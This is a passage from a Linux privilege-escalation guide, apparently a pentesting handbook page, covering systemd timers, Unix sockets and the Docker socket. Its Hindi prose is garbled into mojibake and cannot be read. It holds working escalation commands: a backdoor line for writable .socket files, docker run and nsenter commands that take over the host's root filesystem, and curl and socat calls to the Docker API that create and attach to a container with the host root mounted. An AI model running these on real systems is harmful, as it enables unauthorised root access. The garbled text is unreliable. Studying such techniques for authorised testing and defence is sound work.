> рдпреВрдирд┐рдЯ рдЬрд┐рд╕реЗ рдЗрд╕ рдЯрд╛рдЗрдорд░ рдХреЗ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдкрд░ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рд╣реИред рддрд░реНрдХ рдПрдХ рдпреВрдирд┐рдЯ рдирд╛рдо рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдЙрдкрд╕рд░реНрдЧ ".timer" рдирд╣реАрдВ рд╣реИред рдпрджрд┐ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдпрд╣ рдорд╛рди рдЙрд╕ рд╕реЗрд╡рд╛ рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рдЯрд╛рдЗрдорд░ рдпреВрдирд┐рдЯ рдХреЗ рд╕рдорд╛рди рд╣реЛрддрд╛ рд╣реИ, рдХреЗрд╡рд▓ рдЙрдкрд╕рд░реНрдЧ рдХреЛ рдЫреЛрдбрд╝рдХрд░ред (рдКрдкрд░ рджреЗрдЦреЗрдВред) рдпрд╣ рдЕрдиреБрд╢рдВрд╕рд╛ рдХреА рдЬрд╛рддреА рд╣реИ рдХрд┐ рд╕рдХреНрд░рд┐рдп рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдпреВрдирд┐рдЯ рдХрд╛ рдирд╛рдо рдФрд░ рдЯрд╛рдЗрдорд░ рдпреВрдирд┐рдЯ рдХрд╛ рдирд╛рдо рд╕рдорд╛рди рд░реВрдк рд╕реЗ рдирд╛рдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП, рдХреЗрд╡рд▓ рдЙрдкрд╕рд░реНрдЧ рдХреЛ рдЫреЛрдбрд╝рдХрд░ред

рдЗрд╕рд▓рд┐рдП, рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдЪрд╛рд╣рд┐рдП:

* рдХреБрдЫ systemd рдпреВрдирд┐рдЯ (рдЬреИрд╕реЗ рдПрдХ `.service`) рдЦреЛрдЬреЗрдВ рдЬреЛ **рдПрдХ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рдмрд╛рдЗрдирд░реА** рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИ**
* рдХреБрдЫ systemd рдпреВрдирд┐рдЯ рдЦреЛрдЬреЗрдВ рдЬреЛ **рдПрдХ рд╕рд╛рдкреЗрдХреНрд╖ рдкрде** рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд░рд╣рд╛ рд╣реИ** рдФрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ **systemd PATH** рдкрд░ **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реИ (рдЙрд╕ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдХреА рдирдХрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП)

**`man systemd.timer` рдХреЗ рд╕рд╛рде рдЯрд╛рдЗрдорд░реНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВред**

### **рдЯрд╛рдЗрдорд░ рд╕рдХреНрд╖рдо рдХрд░рдирд╛**

рдЯрд╛рдЗрдорд░ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рд░реВрдЯ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer тЖТ /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕рдВрдЪрд╛рд░** рдХреЛ рд╕рдорд╛рди рдпрд╛ рд╡рд┐рднрд┐рдиреНрди рдорд╢реАрдиреЛрдВ рдкрд░ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд░рд╡рд░ рдореЙрдбрд▓ рдХреЗ рднреАрддрд░ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВред рд╡реЗ рдЗрдВрдЯрд░-рдХрдВрдкреНрдпреВрдЯрд░ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдорд╛рдирдХ Unix рд╡рд░реНрдгрдирдХрд░реНрддрд╛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ `.socket` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реЗрдЯ рдЕрдк рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

Sockets рдХреЛ `.socket` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**`man systemd.socket` рдХреЗ рд╕рд╛рде рд╕реЙрдХреЗрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдиреЗрдВред** рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░, рдХрдИ рджрд┐рд▓рдЪрд╕реНрдк рдкреИрд░рд╛рдореАрдЯрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: рдпреЗ рд╡рд┐рдХрд▓реНрдк рдЕрд▓рдЧ рд╣реИрдВ рд▓реЗрдХрд┐рди рдПрдХ рд╕рд╛рд░рд╛рдВрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ **рдпрд╣ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рд╕реЙрдХреЗрдЯ рдкрд░ рдХрд╣рд╛рдВ рд╕реБрдирдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ** (AF_UNIX рд╕реЙрдХреЗрдЯ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдкрде, рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП IPv4/6 рдФрд░/рдпрд╛ рдкреЛрд░реНрдЯ рдирдВрдмрд░, рдЖрджрд┐)
* `Accept`: рдПрдХ рдмреВрд▓рд┐рдпрди рддрд░реНрдХ рд▓реЗрддрд╛ рд╣реИред рдпрджрд┐ **рд╕рддреНрдп**, рддреЛ **рдкреНрд░рддреНрдпреЗрдХ рдЖрдиреЗ рд╡рд╛рд▓реЗ рдХрдиреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реЗрд╡рд╛ рдЙрджрд╛рд╣рд░рдг рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ** рдФрд░ рдХреЗрд╡рд▓ рдХрдиреЗрдХреНрд╢рди рд╕реЙрдХреЗрдЯ рдЗрд╕реЗ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ **рдЭреВрда**, рддреЛ рд╕рднреА рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ рд╕реЙрдХреЗрдЯ рд╕реНрд╡рдпрдВ **рд╢реБрд░реВ рдХреА рдЧрдИ рд╕реЗрд╡рд╛ рдЗрдХрд╛рдИ** рдХреЛ рдкрд╛рд╕ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдФрд░ рд╕рднреА рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдПрдХ рд╕реЗрд╡рд╛ рдЗрдХрд╛рдИ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИред рдпрд╣ рдорд╛рди рдбрд╛рдЯрд╛рдЧреНрд░рд╛рдо рд╕реЙрдХреЗрдЯ рдФрд░ FIFOs рдХреЗ рд▓рд┐рдП рдЕрдирджреЗрдЦрд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рдПрдХрд▓ рд╕реЗрд╡рд╛ рдЗрдХрд╛рдИ рдмрд┐рдирд╛ рд╢рд░реНрдд рд╕рднреА рдЖрдиреЗ рд╡рд╛рд▓реЗ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рд╕рдВрднрд╛рд▓рддреА рд╣реИред **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЭреВрдард╛ рд╣реИ**ред рдкреНрд░рджрд░реНрд╢рди рдХрд╛рд░рдгреЛрдВ рд╕реЗ, рдирдП рдбреЗрдордиреЛрдВ рдХреЛ рдХреЗрд╡рд▓ `Accept=no` рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рддрд░реАрдХреЗ рд╕реЗ рд▓рд┐рдЦрдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред
* `ExecStartPre`, `ExecStartPost`: рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдХрдорд╛рдВрдб рд▓рд╛рдЗрдиреЛрдВ рдХреЛ рд▓реЗрддрд╛ рд╣реИ, рдЬреЛ **рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ** **рд╕реЙрдХреЗрдЯ**/FIFOs рдХреЗ **рдирд┐рд░реНрдорд╛рдг** рдФрд░ рдмрдВрдзрди рд╕реЗ рдкрд╣рд▓реЗ рдпрд╛ рдмрд╛рдж рдореЗрдВ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрддреЗ рд╣реИрдВред рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдХрд╛ рдкрд╣рд▓рд╛ рдЯреЛрдХрди рдПрдХ рдкреВрд░реНрдг рдлрд╝рд╛рдЗрд▓ рдирд╛рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЙрд╕рдХреЗ рдмрд╛рдж рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рддрд░реНрдХ рд╣реЛрддреЗ рд╣реИрдВред
* `ExecStopPre`, `ExecStopPost`: рдЕрддрд┐рд░рд┐рдХреНрдд **рдХрдорд╛рдВрдб** рдЬреЛ **рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ** **рд╕реЙрдХреЗрдЯ**/FIFOs рдХреЗ **рдмрдВрдж** рдФрд░ рд╣рдЯрд╛рдП рдЬрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдпрд╛ рдмрд╛рдж рдореЗрдВ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрддреЗ рд╣реИрдВред
* `Service`: **рдЖрдиреЗ рд╡рд╛рд▓реЗ рдЯреНрд░реИрдлрд╝рд┐рдХ** рдкрд░ **рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП **рд╕реЗрд╡рд╛** рдЗрдХрд╛рдИ рдирд╛рдо рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╕реЗрдЯрд┐рдВрдЧ рдХреЗрд╡рд▓ рдЙрди рд╕реЙрдХреЗрдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рд╣реИ рдЬрд┐рдирдХрд╛ Accept=no рд╣реИред рдпрд╣ рдЙрд╕ рд╕реЗрд╡рд╛ рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдирд╛рдо рд╕реЙрдХреЗрдЯ рдХреЗ рд╕рдорд╛рди рд╣реЛрддрд╛ рд╣реИ (рд╕ suffрд╝рд┐рдХреНрд╕ рдХреЛ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛)ред рдЕрдзрд┐рдХрд╛рдВрд╢ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

### Writable .socket files

рдпрджрд┐ рдЖрдк рдПрдХ **рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп** `.socket` рдлрд╝рд╛рдЗрд▓ рдкрд╛рддреЗ рд╣реИрдВ рддреЛ рдЖрдк `[Socket]` рдЕрдиреБрднрд╛рдЧ рдХреЗ рд╢реБрд░реВ рдореЗрдВ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ: `ExecStartPre=/home/kali/sys/backdoor` рдФрд░ рдмреИрдХрдбреЛрд░ рд╕реЙрдХреЗрдЯ рдХреЗ рдирд┐рд░реНрдорд╛рдг рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдЖрдкрдХреЛ **рд╕рдВрднрд╡рддрдГ рдорд╢реАрди рдХреЗ рдкреБрдирд░рд╛рд░рдВрдн рд╣реЛрдиреЗ рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рдиреА рд╣реЛрдЧреАред**\
&#xNAN;_&#x4E;ote that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

рдпрджрд┐ рдЖрдк **рдХреЛрдИ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рд╕реЙрдХреЗрдЯ рдкрд╣рдЪрд╛рдирддреЗ рд╣реИрдВ** (_рдЕрдм рд╣рдо Unix Sockets рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрд╛рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧ `.socket` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдирд╣реАрдВ_), рддреЛ **рдЖрдк рдЙрд╕ рд╕реЙрдХреЗрдЯ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рд╢рд╛рдпрдж рдПрдХ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### рдХрдЪреНрдЪрд╛ рдХрдиреЗрдХреНрд╢рди
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**рд╢реЛрд╖рдг рдЙрджрд╛рд╣рд░рдг:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP рд╕реЙрдХреЗрдЯ

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХреБрдЫ **HTTP** рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ **рд╕реЙрдХреЗрдЯ** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ (_рдореИрдВ .socket рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдмрд╛рдд рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реВрдБ рдмрд▓реНрдХрд┐ рдЙрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬреЛ рдпреВрдирд┐рдХреНрд╕ рд╕реЙрдХреЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддреА рд╣реИрдВ_)ред рдЖрдк рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
рдпрджрд┐ рд╕реЙрдХреЗрдЯ **HTTP** рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде **рд╕рдВрд╡рд╛рдж** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╢рд╛рдпрдж **рдХреБрдЫ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рд▓рд╛рдн** рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВред

### Writable Docker Socket

Docker рд╕реЙрдХреЗрдЯ, рдЬреЛ рдЕрдХреНрд╕рд░ `/var/run/docker.sock` рдкрд░ рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬрд┐рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдпрд╣ `root` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ `docker` рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рджреНрд╡рд╛рд░рд╛ рд▓рд┐рдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рд╕реЙрдХреЗрдЯ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдкрд╣реБрдВрдЪ рд╣реЛрдирд╛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИред рдпрд╣рд╛рдБ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╡реИрдХрд▓реНрдкрд┐рдХ рддрд░реАрдХреЗ рдпрджрд┐ Docker CLI рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИред

#### **Privilege Escalation with Docker CLI**

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ Docker рд╕реЙрдХреЗрдЯ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдкрд╣реБрдВрдЪ рд╣реИ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Docker API рдХрд╛ рд╕реАрдзреЗ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛**

рдЙрди рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ Docker CLI рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИ, Docker socket рдХреЛ Docker API рдФрд░ `curl` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрднреА рднреА рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

1.  **Docker Images рдХреА рд╕реВрдЪреА рдмрдирд╛рдПрдВ:** рдЙрдкрд▓рдмреНрдз рдЗрдореЗрдЬ рдХреА рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **Container рдмрдирд╛рдПрдВ:** рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ рддрд╛рдХрд┐ рдПрдХ рдХрдВрдЯреЗрдирд░ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬреЛ рд╣реЛрд╕реНрдЯ рд╕рд┐рд╕реНрдЯрдо рдХреА рд░реВрдЯ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рддрд╛ рд╣реИред

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

рдирдП рдмрдирд╛рдП рдЧрдП рдХрдВрдЯреЗрдирд░ рдХреЛ рд╢реБрд░реВ рдХрд░реЗрдВ:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
3.  **Container рд╕реЗ рдЬреБрдбрд╝реЗрдВ:** рдХрдВрдЯреЗрдирд░ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `socat` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдЬрд┐рд╕рд╕реЗ рдЗрд╕рдХреЗ рднреАрддрд░ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` рдХрдиреЗрдХреНрд╢рди рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЖрдк рд╣реЛрд╕реНрдЯ рдХреЗ рдлрд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд░реВрдЯ-рд╕реНрддрд░реАрдп рдкрд╣реБрдВрдЪ рдХреЗ рд╕рд╛рде рд╕реАрдзреЗ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдХрдорд╛рдВрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### рдЕрдиреНрдп

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ docker socket рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЖрдк **`docker` рд╕рдореВрд╣ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ** рддреЛ рдЖрдкрдХреЗ рдкрд╛рд╕ [**рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рдЕрдзрд┐рдХ рддрд░реАрдХреЗ рд╣реИрдВ**](interesting-groups-linux-pe/#docker-group)ред рдпрджрд┐ [**docker API рдХрд┐рд╕реА рдкреЛрд░реНрдЯ рдореЗрдВ рд╕реБрди рд░рд╣рд╛ рд╣реИ** рддреЛ рдЖрдк рдЗрд╕реЗ рднреА рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ](../../network-services-pentesting/2375-pentesting-docker.md#compromising)ред

**docker рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдпрд╛ рдЗрд╕реЗ рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдЕрдзрд┐рдХ рддрд░реАрдХреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдирд╛

рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк **`ctr`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдХреГрдкрдпрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рдЗрд╕реЗ рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдирд╛

рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк **`runc`** рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдХреГрдкрдпрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ рдХреНрдпреЛрдВрдХрд┐ **рдЖрдк рдЗрд╕реЗ рдЕрдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus рдПрдХ рдЬрдЯрд┐рд▓ **рдЗрдВрдЯрд░-рдкреНрд░реЛрд╕реЗрд╕ рдХрдореНрдпреБрдирд┐рдХреЗрд╢рди (IPC) рд╕рд┐рд╕реНрдЯрдо** рд╣реИ рдЬреЛ рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡реА рдврдВрдЧ рд╕реЗ рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдФрд░ рдбреЗрдЯрд╛ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдмрдирд╛рддрд╛ рд╣реИред рдЖрдзреБрдирд┐рдХ Linux рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрддреЗ рд╣реБрдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛, рдпрд╣ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рд╕рдВрдЪрд╛рд░ рдХреЗ рд▓рд┐рдП рдПрдХ рдордЬрдмреВрдд рдврд╛рдВрдЪрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

